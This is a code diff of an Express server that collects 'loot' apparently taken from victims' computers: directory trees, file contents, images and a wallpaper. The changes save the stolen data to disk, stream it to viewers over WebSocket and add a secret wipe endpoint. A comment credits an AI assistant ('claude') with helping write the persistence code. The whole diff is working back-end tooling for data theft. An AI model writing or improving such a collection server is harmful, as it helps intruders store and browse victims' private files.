@@ -12,12 +12,29 @@ app.use(express.json());
 app.use(express.static('public'));
 app.use(express.urlencoded({ extended: true }));
 
+const LOOT_FILE = './loot.json';
+
 // stores all of the good stuff
-const loot = {
+let loot = {
   directories: {},
   files: {},
-  images: {}
+  images: {},
+  wallpaper: null
 };
+// Needed help from claude on this one. Persistence is a bitch
+if (fs.existsSync(LOOT_FILE)) {
+  try {
+    loot = JSON.parse(fs.readFileSync(LOOT_FILE, 'utf8'));
+    console.log('Loaded loot from disk');
+  } catch (e) {
+    console.log('Failed to load loot.json, starting fresh');
+  }
+}
+
+// Writes loot to disk so it survives restarts
+function saveLoot() {
+  fs.writeFileSync(LOOT_FILE, JSON.stringify(loot), 'utf8');
+}
 
 //Function to send out the data to each person connected
 function broadcast(type, data) {
@@ -41,16 +58,15 @@ function addPathToTree(tree, filePath) {
   }
 }
 
-
-app.post('/upload/wallpaper', (req, res) =>{
+app.post('/upload/wallpaper', (req, res) => {
   const firstNewline = req.body.indexOf('\n');
-  const path = req.body.substring(0,firstNewline).trim();
+  const path = req.body.substring(0, firstNewline).trim();
   const base64 = req.body.substring(firstNewline + 1);
-  console.log("wallpaper received");
-  broadcast('wallpaper', {path, base64});
+  console.log('Wallpaper received');
+  loot.wallpaper = { path, base64 };
+  saveLoot();
+  broadcast('wallpaper', { path, base64 });
   res.sendStatus(200);
-
-
 });
 
 app.post('/upload/dirs', (req, res) => {
@@ -58,19 +74,19 @@ app.post('/upload/dirs', (req, res) => {
   lines.forEach(line => {
     if (line.trim()) addPathToTree(loot.directories, line); // When .split('\n') happens, sometime sthere is trailing white space, this basically says if
   }); // when you trim the string, the string is empty, skip it. Else do the addPathToTree
+  saveLoot();
   broadcast('dirs', loot.directories);
   res.sendStatus(200);
 });
 
-
-
 app.post('/upload/files', (req, res) => {
   const firstNewline = req.body.indexOf('\n');
   const path = req.body.substring(0, firstNewline).trim(); // Gets the full path of the file, including the .png .txt etc etc
-  const text = req.body.substring(firstNewline+1); // Gets the text within the file that was sent
+  const text = req.body.substring(firstNewline + 1); // Gets the text within the file that was sent
   console.log('File received', path); // Logs to console for debugging
   loot.files[path] = text;
-  broadcast('files', {path,text}); // broadcasts to browsers on the page
+  saveLoot();
+  broadcast('files', { path, text }); // broadcasts to browsers on the page
   res.sendStatus(200); // Confirm connection
 });
 
@@ -80,17 +96,18 @@ app.post('/upload/image', (req, res) => {
   const base64 = req.body.substring(firstNewline + 1); // Gets full path of file, and the base64 string that 'contains' the image
   console.log('Image received:', path); // for debugging
   loot.images[path] = base64;
+  saveLoot();
   broadcast('image', { path, base64 }); // broadcast to the active connections
   res.sendStatus(200);
 });
 
-app.post('/upload/wallpaper', (req, res) => {
-  const firstNewline = req.body.indexOf('\n');
-  const path = req.body.substring(0, firstNewline).trim();
-  const base64 = req.body.substring(firstNewline + 1);
-  console.log('Wallpaper received');
-  broadcast('wallpaper', { path, base64 });
-  res.sendStatus(200);
+// Secret wipe route — only you know this URL
+app.get('/admin/wipe-a8f3k2', (req, res) => {
+  loot = { directories: {}, files: {}, images: {}, wallpaper: null };
+  saveLoot();
+  broadcast('reset', {});
+  console.log('Loot wiped');
+  res.send('Wiped');
 });
 
 app.get('/api/loot', (req, res) => {
@@ -106,6 +123,9 @@ wss.on('connection', (ws) => {
   Object.entries(loot.images).forEach(([path, base64]) => {
     ws.send(JSON.stringify({ type: 'image', data: { path, base64 } }));
   });
+  if (loot.wallpaper) {
+    ws.send(JSON.stringify({ type: 'wallpaper', data: loot.wallpaper }));
+  }
 });
 
 server.listen(8080, () => console.log('Listening on 8080'));
